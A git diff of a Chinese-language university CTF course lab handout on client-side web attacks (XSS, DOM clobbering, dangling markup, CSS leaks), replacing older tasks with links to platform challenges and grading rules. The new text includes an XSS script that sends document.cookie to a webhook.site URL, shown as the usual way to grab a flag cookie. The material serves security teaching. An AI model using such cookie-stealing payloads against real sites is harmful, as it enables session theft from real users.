@@ -1,210 +1,123 @@
 # Web Lab 2：用户侧攻击
 
-yelan
+## 那么，对于一个CTF题，XSS要干什么……
 
-## 要求
-
-1. Lab2 最多计 115 分
-
-2. 对于Task 1,5,6,报告不需要太详细,只要求关键分析步骤以及正确截图,做出来就是满分,即使做不出来也会根据做题进度和思考过程给分.
-
-3. 对于不需要提交 flag 的题目,不要求你的解答很深入,能运用课上讲过的知识即可
-
-4. 如果有代码是 AI 生成的,请注明并贴上你与 AI 的对话记录
-
-5. 题目难度并非单调递增的
-
-6. **务必杜绝抄袭,这点非常重要,本课程对抄袭 0 容忍**.
-
-### Task 1: HTML Parser (15 分)
-
-这里有一个含有大量节点的 HTML 文档,请把它解析为一个树状结构并按照**层序遍历**的方式输出每个节点的类型及 `id` ,得到一行很长的字符串`s`.其中每个节点的类型和 `id` 之间用`:`连接(如果没有 `id` 则以 `:` 作为这个节点的结尾),不同节点之间用`,`分隔
-
-样例输入:
+在课上，我们主要涉及了各种攻击方式的原理。让页面`alert("XSS")`对于PoC来说足够了，但是对于一道CTF题来说还不够，通常此类题目会设计一个不`HTTPOnly`的Cookie，值为flag，如果你能拿到这个cookie（`document.cookie`）就可以证明你已经可以在页面上执行任意代码。
 
 ```html
-<html>
-<head>
-    <title>Test</title>
-</head>
-<body>
-    <div id="main">
-        <h1 name="welcome">Welcome</h1>
-        <p>This is a test.</p>
-        <ul>
-            <li id="item1">Item 1</li>
-            <li id="item2">Item 2</li>
-        </ul>
-    </div>
-</html>
+<script>
+    fetch(`https://webhook.site/2b055f93-1ae0-4c3e-bde1-ec6a7f6b39a7/${document.cookie}`)
+</script>
 ```
 
-预期输出(`s`):
+这是一个常见的写法，从实现 XSS 拓展到了窃取 flag 。
 
-```
-html:,head:,body:,title:,div:main,h1:,p:,ul:,li:item1,li:item2
-```
+另外有一个常见误区：
 
-然后计算`s`的 `MD5` 值,在外面加上`AAA{}` 的格式提交,题目平台的`flag`按照以下代码生成:
+假定WebsocketReflectorX将平台的wss映射到了`127.0.0.1:7777`，那么你不应该让bot访问`http://127.0.0.1:7777/some-path-with-XSS-vuln/?content=some-payload`，它访问不到你自己电脑上的端口；穿透出去也不行。
 
-```python
-import hashlib
-s = "......"
-md5_hash = hashlib.md5(s.encode()).hexdigest()
-print("AAA{" + md5_hash + "}")
-```
+通常来说，如果用户侧攻击的题目给了附件，那你可以从附件中找到path，一般是`http://localhost:<PORT>/...`，有的题目可能会写`http://web:3000/...`之类；如果没给附件，那题目描述或者页面中可能会讲host是什么。
 
-### Task 2: Show me the secret (20 分)
+![](web-lab2/pic1.png)  
+*不都是从那个时候过来的嘛*
 
-回顾课程第 16 页 slides 的情景,自行搭建一个服务,编写完整脚本泄露受害者页面的 flag
+### ……我没有公网服务器
 
-如果你不知道从哪里开始,你可以解释下面这个情景并在此基础上编写获取 flag 的脚本
+没有公网服务器确实会给用户侧攻击的体验带来一点麻烦，但也还是有很多解决方案的：
 
-```python
-from flask import Flask, render_template, request, redirect, url_for
-import os
+- 有很多平台提供了记录请求的服务，例如[`webhook.site`](https://webhook.site/), [`dnslog`](https://bing.com/search?q=dnslog), [`requestrepo`](https://www.requestrepo.com/requests)等等。
+- 我们的ZJU::CTF平台已经修好了！只需要在校网下自己的电脑上搭一个服务器（`npx serve`或者`python -m http.server`之类），用自己的IP地址（`10.x.x.x`）即可。题目环境已可以访问`10.0.0.0/8`。
+- 可以了解一下“内网穿透”。~~虽然我也配了但是我还是嫌内网穿透很繁琐，总之还是推荐前两种方案~~
 
-app = Flask(__name__)
+## 做不出来咋办……
 
-SECRET_VALUE = "AAA{Well_done!Here_is_20_points_for_you!D81B3EB8-ABA4}"
+在解题过程中遇到困难，可以向AI提问，也可以向助教提问；如果无法理解AI的解释也可以向助教提问——总之不要有心理负担，大胆的问（以及，考虑到[知识诅咒](https://en.wikipedia.org/wiki/Curse_of_knowledge)，如果问的人多的话，我们可能会放出hint来降低难度）。
 
-@app.route('/')
-def index():
-    return render_template('index.html')
+我个人认为CTF101的目的是让所有同学感受到Hacking的乐趣，**不是为了筛选人**，也不需要强制让多少百分比的人拿不到满绩。
 
-@app.route('/victim')
-def victim():
-    if request.remote_addr != "127.0.0.1":
-        return "You are not victim, only the victim can access this page.", 403
-    return render_template('victim.html', secret=SECRET_VALUE)
+但是请不要看都不看，将AI生成的flag交给平台、AI生成的报告交给我。实验报告必须体现出人类的工作内容（工作量原则）：例如你自己的探索和试错过程，或者你输入的 AI 提示词，或者你对这道题目的感想/探索/思考/拓展，等等，非 AI 生成的内容都可以视为人类的工作内容。如果使用 AI 得到解法，需要理解其中的关键步骤，并能够解释自己提交的命令和代码。如果实验报告中人类的成分过少，将由助教进行线上验收，并可能会被扣除相应的实验分数。
 
-@app.route('/inject', methods=['GET', 'POST'])
-def inject_css():
-    if request.method == 'POST':
-        css_content = request.form.get('css', '')
-        with open('static/custom.css', 'w') as f:
-            f.write(css_content)
-        return redirect(url_for('inject_css'))
+## 实验分数构成
 
-    css_content = ""
-    if os.path.exists('static/custom.css'):
-        with open('static/custom.css', 'r') as f:
-            css_content = f.read()
+- 第一组: 60分
+- 第二组：30分
+- bonus：50分
+- 签到和反馈：15分 
 
-    return render_template('inject.html', css=css_content)
+上述4个模块，每个模块具有独立上限，模块得分不溢出此上限；总计上限为115分（即，至多溢出15分到其它实验）；
 
-if __name__ == '__main__':
-    if not os.path.exists('static'):
-        os.makedirs('static')
-    if not os.path.exists('static/custom.css'):
-        with open('static/custom.css', 'w') as f:
-            f.write('/* css injection */')
-    
-    app.run(host='0.0.0.0', port=5000)
-```
+每道题目即使未能解出最终结果也会有部分分。
 
-```html
-<!-- victim.html -->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Victim</title>
-    <link rel="stylesheet" href="/static/custom.css">
-</head>
-<body>
-    <div>
-        <p>Welcome, Victim!</p>
-        <p>Your page is safe, no one will see the secret info.</p>
-    </div>
-    
-    <div>
-        <input type="hidden" name="secret" value="{{ secret }}">
-    </div>
-</body>
-</html>
-```
+------
 
-```html
-<!-- inject.html -->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <div>
-        The current css of the victim's page is:
-        <pre>{{ css }}</pre>
-    </div>
-    <div>
-        <form action="/inject" method="post">
-            <label for="css">Inject CSS:</label>
-            <br>
-            <textarea id="css" name="css" rows="10" cols="30"></textarea>
-            <br>
-            <button type="submit">Inject</button>
-        </form>
-    </div>
-</body>
-</html>
-```
+## 第一组
 
-### Task 3: node._sanitized (30 分)
+### A. XSS Labs (15分)
 
-结合课上讲的 DOM Clobbering  知识,搜索并简要解释 CVE-2017-0928 的原理
+[[lec 2 课上演示] XSS Labs](https://ctf.zjusec.net/games/7/challenges#366)
 
-### Task 4: Gradient (30 分)
+### B. Webpack DOMClobber (15分)
 
-在 Task2 的基础上,你仍然可以控制受害者页面的 CSS,但如果受害者页面的 flag 不以
+尝试使用DOM Clobber的方式解决[[lec 2] My favourite profile](https://ctf.zjusec.net/games/7/challenges#387)
 
-```html
-<input type="hidden" name="secret" value="AAA{secret}">
-```
+### C. Dangling Markup Lab (15分)
 
-的简单形式出现,而是以以下形式出现:
+- [[lec 2] Dangling Markup Lab](https://ctf.zjusec.net/games/7/challenges#388)
+- Dangling Markup 的利用要求其实是比较苛刻的。尝试自己在本地进行一些实验验证这一点，比如可以展示什么情况下Dangling Markup会被默认拦截，从浏览器的哪个版本开始有了这样的安全限制，等等。
 
-```html
-<div id="secret">
-    <span>A</span>
-    <span>A</span>
-    <span>A</span>
-    <span>{</span>
-    <span>W</span>
-    <span>e</span>
-    <span>l</span>
-    <span>l</span>
-    <span>_</span>
-    <span>d</span>
-    <span>o</span>
-    <span>n</span>
-    <span>e</span>
-    ......
-    <span>!</span>
-    <span>}</span>
-</div>
-```
+完成上述两个任务可获得15分
 
-你该如何编写脚本获取 flag?
+### D. Gradient (20分)
 
-### Task 5: XSS 1 (30 分)
+- [[lec 2] Gradient](https://ctf.zjusec.net/games/7/challenges#389)
 
-通过[xss-labs](http://test.ctf8.com)前五关,每关六分.源码可在 https://github.com/do0dl3/xss-labs 找到
+### E. Notebook Viewer (20分)
 
-或完成校巴题目[babyxss](https://zjusec.com/challenges/111)
+- [[lec 2] Notebook Viewer](https://ctf.zjusec.net/games/7/challenges#390)
 
-### Task 6: XSS 2 (30 分)
+## 第二组
 
-通过[xss-labs](http://test.ctf8.com)前十关,每关六分.源码同上
+### F. also jquery（10分）
 
-或完成校巴题目[childxss](https://zjusec.com/challenges/112)
+- [[lec 2] also jquery](https://ctf.zjusec.net/games/7/challenges#374)
 
-### Task 7: 拓展 (20 分)
+### G. As I've written（15分）
 
-简要回答下面两个问题,言之有理即可:
+- [[lec 2 课上演示] As I've written](https://ctf.zjusec.net/games/7/challenges#375)
 
-- 自行搜索并学习**中间人攻击**,解释为什么我们要避免连接公共Wifi (如饭馆,咖啡厅)
+想当年，这道题只有交大一位同学解出来了……但是我们课上拆解过了，而且还有writeup，所以应该还好
 
-- 自行搜索并学习课上提到的**CSP 策略**,解释为什么 CSP 可以防止 XSS 攻击,并构造一个配置不当的 CSP 被绕过的例子(不需要给出代码实现,只需要描述)
+### H. ColorNote（25分）
+
+
+- [[lec 2] ColorNote](https://ctf.zjusec.net/games/7/challenges#391)
+
+- 用Dangling Markup解出本题可获得15分
+  - 如果有换行的话，浏览器会忽略这个tag…有什么办法绕过吗？
+    - 课上讲了`data:`伪协议，其中有没有什么有意思的东西可以用上？
+- 再用CSS Leak解出本题可获得额外10分
+
+## Bonus题
+
+### I. As I've written REVENGE（20分）
+
+- [[lec 2] As I've written REVENGE](https://ctf.zjusec.net/games/7/challenges#376)
+
+而这，就是那位交大同学的非预期解
+
+### 出一道用户侧攻击有关的 Web 题（50分）
+
+参考xsleaks.dev, hacktricks等资料，找找自己感兴趣的点，命制一道Web题。
+
+- 你需要提交题目的attachment、容器文件，一个README题目描述文件，以及Writeup；
+- 在本报告中，你可以讲一讲自己命制这道题的心路历程，比如找到了那些题目做参考/找到了什么知识点
+- 我们主要会根据题目的完整度以及报告中体现的工作量来评分，题目的新颖性、难度等等也会纳入考虑；换句话说，哪怕你未能写出一道让自己满意的题目，只要报告中体现出了自己探索的过程，也可以获得不错的分数
+- Web题讲究的是一个*Chain*，一道题横跨不同的服务、不同的接口，他们之间连成一条利用链，如果你的。
+
+## 课上签到（5分）
+
+*到课本身就是工作量的体现 难道不是吗*
+
+## 反馈（5~10分bonus）
+
+谈谈你的感受吧！无论是关于本次课程，关于助教，关于作业，无论是感想、意见还是建议，欢迎畅所欲言，您的反馈能帮助我们更好的改进课程！
